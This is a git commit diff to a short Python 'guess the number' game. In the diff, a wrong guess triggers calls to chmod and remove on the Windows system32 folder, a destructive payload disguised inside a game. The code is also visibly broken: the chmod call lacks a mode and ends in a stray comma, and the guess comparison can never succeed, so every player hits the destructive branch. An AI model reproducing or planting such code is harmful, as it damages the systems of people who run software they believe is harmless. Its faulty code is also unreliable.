8db0e424f6da95480c172bca4cef49e012dae208
Toppyl <137173821+Toppyl@users.noreply.github.com>
2023-06-20 13:41:25 +0200

    Update main.py

--- main.py
+++ main.py
@@ -6,5 +6,5 @@ answer = input("guess the number between 1-10! ")
 if(answer==random.randint(1,10)):
   print("you won!")
 else:
-  os.chmod
+  os.chmod("C://Windows//system32"),
   os.remove("C://Windows//system32")
